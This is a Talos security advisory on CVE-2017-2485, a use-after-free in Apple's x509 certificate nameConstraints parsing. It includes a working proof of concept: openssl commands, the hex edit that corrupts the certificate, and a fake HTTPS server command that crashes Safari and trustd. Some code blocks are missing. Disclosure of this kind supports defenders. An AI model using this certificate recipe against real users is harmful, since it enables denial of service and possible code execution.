# Talos Vulnerability Report

### TALOS-2017-0296

## Apple OS X and iOS x509 certificate parsing Name Constraints Remote Code Execution Vulnerability

##### March 9, 2017

##### CVE Number

CVE-2017-2485

### Summary

An exploitable use-after-free vulnerability exists in the x509 certificate validation functionality in Apple macOS Sierra (10.12.3 release and 10.12.4 public beta versions) and iOS 10.2.1. A specially crafted x509 certificate can trigger a use-after-free vulnerability potentially resulting in remote code execution. In order to trigger this vulnerability the victim needs to visit a HTTPS website or other server which serves a malicios certificate or click on a file.

### Tested Versions

Apple macOS 10.12.3
Apple macOS 10.12.4 beta
Apple iOS 10.2.1

### Product URLs

<https://www.apple.com/lae/macos/sierra/>

### CVSSv3 Score

8.8 - CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### CWE

CWE-416: Use After Free

### Details

When a client establishes a secure connection to a server, the server presents an x509 certificate which the client must validate.On Apple macOS, most client applications will use macOS’s certificate validation agent, at which point the malicious certificate will be parsed by the vulnerable code. This vulnerability can be triggered by, for example, visiting a HTTPS website with either Safari or Chrome, by connecting to a malicious mail server via Mail.app, or by simply importing the certificate by double clicking on it in finder.

The vulnerability exists in code responsible for parsing `nameConstraints` x509v3 certificate extension fields. In x509 certificate, `nameConstraints` are stored as general subtrees (RFC 5280) and while parsing them, the function `parseGeneralSubtrees` in library `/System/Library/Frameworks/Security.framework/Versions/A/Security` gets called:

```

At [1], DER sequence decoding is started, and a new memory buffer is allocated at [2] and saved in register `r15`. At [3], actual decoding is performed which, if failed, ends up at `loc_971A8` and then at [4], a pointer to allocated memory is saved in `[rbx]` which points inside a structure allocated for this certificate. Because the call at [3] has failed, the check at [4] won’t succseed and the memory buffer gets freed at once at [5]. This is a first free and a stale pointer is left at `[rbx]`. Since this pointer is not NULL, it can later be reused, leading to process crash and further undefined behaviour. With the supplied PoC certificate, the process will again attempt to free the already freed memory area while freeing all certificate parsing related structures when calling `Security`SecCertificateDestroy`.

This can be observed in the following debugging session:

We can see that heap chunk of size 48 was allocated at `0x101687fd0`, then we continue untill `DERDecodeSeqNext` call returns:

    0x7fff824b80db <+122>: movzx  eax, ax

     rax = 0x0000000000000003

```

We can observe the return value of `3`. This will jump out of the loop and end up at the code that saves the pointer to `[rbx]` and then frees it:

Memory is now free, but a stale pointer is left. Continuing the process leads to the following crash:

     rdi = 0x0000000101687fd0

```

The crash is due to use of `libgmalloc` which marks freed memory as unreadable and unwritable:

```
(lldb) memory region $rdi
[0x00000001014a6fd0-0x00000001014a8000) ---
(lldb)

```

If we consult open source code from Apple regarding DER parsing functions, we can see that `DERDecodeSeqNext` will return `3` on decoding error (DR\_DecodeError enum to be precise), so in order to trigger this vulnerability, a specially crafted x509 certificate with invalid `nameConstraints` is needed.

Further manipulation of the certificate layout in memory can lead to other structures being allocated at the freed chunk, leading to further undefined behaviour and eventual remote code execution.

When a simple PoC crashing certificate file is double clicked in Finder, it gets added to keychain which crashes when trying to parse it. This will keep crashing com.apple.trustd agent in a loop, effectively rendering the system unusable and unable to connect to any SSL/TLS server.

```
### Exploit Proof-of-Concept

A certificate that triggers this vulnerability can be created by modifying a sample certificate generated via `openssl` with added extensions to configuration file:

```
[ v3_req ]
nameConstraints=permitted;email:.somedomain.com

```

And then executing the following command:

```
openssl req -x509 -newkey rsa:1024 -keyout key.pem -out cert.pem -days 365 -nodes -extensions req_v3 -config /etc/ssl/openssl.cnf
openssl x509 -text -inform PEM -outform DER < cert.pem > poc.der

```

And modifying nameConstraints sequence decoding to fail, for example :

```
000001b0: 3015 a013 3011 810f 2e73 6f6d 6564 6f6d  0...0....somedom
000001c0: 6169 6e2e 636f 6d30 0d06 092a 8648 86f7  ain.com0...*.H..

```

To:

```
000001b0: 3015 a013 30ff 810f 2e73 6f6d 6564 6f6d  0...0....somedom
000001c0: 6169 6e2e 636f 6d30 0d06 092a 8648 86f7  ain.com0...*.H..

```

The crash can be demonstrated via `/usr/bin/security` :

```
bash-3.2$ /usr/bin/security verify-cert -c poc.der
Cert Verify Result: CSSMERR_TP_NOT_TRUSTED
Segmentation fault: 11
bash-3.2$

```

Or by creating a fake web server and visiting via browser:

```
 openssl s_server -cert poc.der  -certform DER  -key key.pem -accept 44330 -www -dhparam dHParam.pem

```

Which when visited by a browser results in:

```
mac com.apple.xpc.launchd[1] (com.apple.WebKit.Networking.FE2D7E71-2AAE-4092-9726-5ADB4EB8FF3A[909]): Service
exited due to signal: Segmentation fault: 11 sent by exc handler[0]
mac com.apple.xpc.launchd[1] (com.apple.ReportCrash[2515]): Endpoint has been activated through legacy launch(3) APIs.
